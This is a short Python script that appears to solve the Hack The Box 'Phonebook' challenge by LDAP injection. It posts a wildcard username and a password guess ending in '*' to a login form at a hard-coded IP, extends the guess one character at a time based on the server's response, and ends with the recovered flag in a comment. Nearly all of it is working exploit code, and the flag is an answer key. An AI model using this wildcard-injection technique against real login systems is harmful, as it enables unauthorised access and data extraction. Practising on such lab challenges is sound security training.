# Hackthebox: Phonebook
# LDAP Injection

import requests
from pwn import success
from string import ascii_lowercase, digits, punctuation

flag = 'HTB{*'
URL = 'http://159.65.58.189:31603/login'

while True:
    for c in ascii_lowercase + digits + punctuation:
        if c != '*':
            print(c)
            r = requests.post(URL, data={'username': '*', 'password': f'{flag + c}*'})
            if 'No search results' in r.text:
                flag += c
                success(flag)
                if flag[-1] == '}':
                    exit()
                break

# HTB{d1rectory_h4xx0r_is_k00l}
